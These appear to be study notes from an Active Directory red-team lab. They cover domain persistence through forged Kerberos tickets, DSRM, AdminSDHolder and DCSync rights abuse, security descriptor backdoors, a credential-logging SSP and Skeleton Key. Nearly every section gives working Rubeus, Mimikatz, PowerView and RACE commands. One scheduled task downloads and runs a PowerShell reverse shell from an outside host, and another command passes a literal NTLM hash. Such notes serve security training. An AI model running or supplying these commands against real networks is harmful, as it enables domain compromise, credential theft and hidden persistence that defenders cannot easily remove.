### Sapphire Ticket
A sapphire ticket is similar to a Diamond ticket, in that it retrieves a real TGT, and copies data from that PAC onto the forged ticket. However, instead of using the ticket retrieved in the initial authentication, an additional step is performed to retrieve a PAC for another (presumably high-privilege) user:

- Authenticating to the KDC
- Using the S4U2Self and U2U extensions to request a TGS for a high-privilege user (this mirrors what the real user’s PAC would look like, but the ticket is unusable in high-privilege contexts)
- Decrypt this information
- Setting properties of the forged PAC to mirror those in the valid TGT
- Encrypting the forged ticket with the krbtgt hash

The primary requirement of a Sapphire ticket is the same as for Golden and Diamond tickets: knowledge of the krbtgt hash of the domain. The `DOMAIN_SID` and `DOMAIN_RID` properties are not required, as this is retrieved from the valid TGT.

To perform the first step (retrieving the TGT), you must provide sufficient information to authenticate to the domain (i.e. `RHOST`, `USERNAME` and `PASSWORD`).

---
### Diamond Ticket
- A diamond ticket is _created by deciphering a valid TGT_, making changes to it and re-encrypt it using the AES keys of the krbtgt account.
- Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack.
- A diamond ticket is more opsec safe as it has:
	- Valid ticket times because a TGT issued by the DC is modified
	- In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.

__Process__
- Performing an AS-REQ request to retrieve a TGT for any user
- Using the krbtgt hash to decrypt the real ticket
- Setting properties of the forged PAC to mirror those in the valid TGT
- Encrypting the forged ticket with the krbtgt hash

#### Attack
```powershell
Rubeus.exe diamond
/krbkey:$hash /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
• We could also use _/tgtdeleg_ option in place of credentials in case we have access as a domain user:
```powershell
Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local 
/dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```



---
### Silver Ticket
- Encrypted and Signed by the hash of the service account of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).

![[Pasted image 20240308002323.png]]

#### Attack
- Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
```powershell
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:$hash /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
• Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more

![[Pasted image 20231215170859.png]]

#### Schedule and execute a task - noisy
```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
```
```powershell
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```

Command execution on the domain controller by creating silver tickets for:
– HOST service
– WMI


---
### Golden Ticket
- A golden ticket is signed and encrypted by the hash of krbtgt account for TGT ticket.
- The krbtgt user hash could be used to _impersonate any user with any privileges_ from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

#### Attack
- Run mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

• To use the DC-Sync feature for getting AES keys for krbtgt account. Run with DA privileges (or a user that has replication rights on the domain object):
```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

__Create Golden Ticket__
```powershell
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:$key /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

![[Pasted image 20231215170136.png]]
![[Pasted image 20231215170247.png]]

---
### DSRM
- DSRM is _Directory Services Restore Mode_.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
#### Attack
- Dump DSRM password (needs DA privileges)
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
-Computername dcorp-dc
```
- Compare the Administrator hash with the Administrator hash of below command
- First one is the DSRM local Administrator.
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```
- Since it is the local administrator of the DC, we can _pass the hash_ to authenticate.
- But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash:
```powershell
Enter-PSSession -Computername dcorp-dc
```

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
- Pass the hash
- Here. domain value is domain controller computer name
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-
dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

```powershell
ls \\dcorp-dc\C$
```

---
### WriteDACL 
![[Pasted image 20231218153813.png]]

---
### ACL - AdminSDHolder
- Resides in the _System container of a domain_ and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
- _Security Descriptor Propagator_ (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
![[Pasted image 20231218115220.png]]
![[Pasted image 20231218115252.png]]

- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

#### Attack
- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student30 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
-  Using ActiveDirectory Module and [RACE toolkit](https://github.com/samratashok/RACE) :
```powershell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```
- Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

__SDProp Manually__
- Invoke-SDPropagator.ps1 
```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```
- For pre-Server 2008 machines:
```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```


---
### ACL - Rights Abuse (DCSync)
__Add FullControl rights__
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
- Using ActiveDirectory Module and RACE:
```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
```
__Add rights for DCSync__
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

- Using ActiveDirectory Module and RACE:
```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
```
__Execute DCSync__
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
---
### ACL - Security Descriptors
- It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.  
- _Administrative privileges are required for this._
- Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:
	- ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
- ACE for built-in administrators for WMI namespaces:
	- A;CI;CCDCLCSWRPWPRCWD;;;SID

>Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges
#### Attack
ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit: `. C:\AD\Tools\RACE-master\RACE.ps1`
__WMI (RACE toolkit)__
- On local machine for student1:
```powershell
Set-RemoteWMI -SamAccountName student30 -Verbose
```
- On remote machine for student1 without explicit credentials:
```powershell
Set-RemoteWMI -SamAccountName student30 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```
__W/ Explicit creds__
- On remote machine. Only root\\cimv2 and nested namespaces:
```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential Administrator -namespace 'root\cimv2' -Verbose
```

__Remove Permissions__
- Remote machine
```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Remove -Verbose
```

##### PS Remoting (RACE toolkit) - backdoor, not stable after August 2020 patches
- On local machine for student30:
```powershell
Set-RemotePSRemoting -SamAccountName student30 -Verbose
```

- On remote machine for student1 without credentials:
```powershell
 Set-RemotePSRemoting -SamAccountName student30 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

- On remote machine, remove the permissions:
```powershell
Set-RemotePSRemoting -SamAccountName student30 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Remove
```

##### Remote registry backdoor (RACE/DAMP) - with admin privs on remote machine

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student30 -Verbose
```

- As student1, retrieve machine account hash:
```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

- Retrieve local account hash:
```powershell
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

- Retrieve domain cached credentials:
```powershell
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```


---
### Custom SSP
- A _Security Support Provider_ (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:
	- NTLM
	- Kerberos
	- Wdigest
	- CredSSP
- Mimikatz provides a custom SSP - mimilib.dll. This SSP _logs local logons, service account and machine account passwords in clear text on the target server_.
- Once the SSP is registered, all users who log on to the DC, as well as all local services, will log their passwords to the _C:\\Windows\\System32\\mimilsa.log_ file. That file will contain the clear text passwords for all users who have logged on and service accounts running on the system.
#### Attack
- We can use either of the ways:
1. Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`

```powershell
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages'| select -ExpandProperty 'Security Packages'
```

```powershell
$packages += "mimilib"
```

```powershell
Set-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages' -Value $packages
```

```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
```
- Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```
2. All local logons on the DC are logged to:
```powershell
cat C:\Windows\system32\mimilsa.log
```

---
### Skeleton Key
- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it _allows access as any user with a single password_.
- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
- All the publicly known methods are NOT persistent across reboots.
- Yet again, mimikatz to the rescue.

>Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.

#### Attack
- Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. _DA privileges required_
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' 
-ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
- Now, it is possible to access any machine with a valid username and password as "mimikatz"
```powershell
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```
- In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```
> Note that above would be very noisy in logs - Service installation (Kernel mode driver)














